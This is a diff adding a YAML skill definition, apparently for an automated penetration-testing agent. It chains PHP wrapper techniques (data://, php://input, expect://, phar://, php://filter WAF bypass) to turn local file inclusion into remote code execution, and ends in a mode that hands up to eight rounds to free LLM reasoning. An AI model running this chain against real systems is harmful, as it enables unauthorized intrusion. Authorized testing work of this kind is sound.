@@ -1,0 +1,95 @@
+skill_id: lfi_wrapper_rce
+name: "LFI PHP Wrapper RCE"
+category: web_rce
+phase: foothold
+version: "1.0"
+
+match:
+  rules:
+    - variable_present: ["lfi_confirmed"]
+      evidence_contains: ["LFI"]
+    - variable_present: ["lfi_param"]
+    - evidence_contains: ["php"]
+      evidence_contains: ["file inclusion"]
+
+probes: []
+
+exploit_paths:
+  - path_id: lfi_wrapper_rce
+    name: "PHP Wrapper 直接 RCE（data:// / php://input / expect:// / phar://）"
+    priority: 1
+    conditions:
+      lfi_confirmed: true
+    on_success:
+      action: publish_event
+      event:
+        event_type: rce_achieved
+        target_skill_ids: []
+        payload:
+          method: "lfi_wrapper_rce"
+          skill_id: "lfi_wrapper_rce"
+    steps:
+      - id: try_data_wrapper
+        description: "data:// wrapper 执行系统命令"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_data.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: try_input_wrapper
+        evidence_capture:
+          shell_type: "rce_data_wrapper"
+
+      - id: try_input_wrapper
+        description: "php://input POST 方式执行系统命令"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_input.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: try_expect_wrapper
+        evidence_capture:
+          shell_type: "rce_input_wrapper"
+
+      - id: try_expect_wrapper
+        description: "expect:// wrapper 直接命令执行（需 expect 扩展）"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_expect.sh {ENDPOINT}"
+        timeout: 45
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: try_phar_zip_wrapper
+        evidence_capture:
+          shell_type: "rce_expect_wrapper"
+
+      - id: try_phar_zip_wrapper
+        description: "phar:// / zip:// wrapper 利用"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_phar_zip.sh {ENDPOINT}"
+        timeout: 30
+        success_criteria:
+          stdout_contains: "PHAR_WRAPPER_AVAILABLE"
+        on_success: try_filter_chain_waf
+        on_fail: try_filter_chain_waf
+        evidence_capture:
+          shell_type: "info"
+          phar_available: stdout
+
+      - id: try_filter_chain_waf
+        description: "php://filter 高级链 WAF 绕过"
+        command: "bash {skill_dir}/scripts/exploit_wrapper_filter_chain.sh {ENDPOINT}"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["FILTER_CHAIN_WAF_BYPASS", "FILTER_CHAIN_DEFLATE"]
+        on_success: next_path
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 8
+
+remediation: |
+  关闭 allow_url_fopen 和 allow_url_include
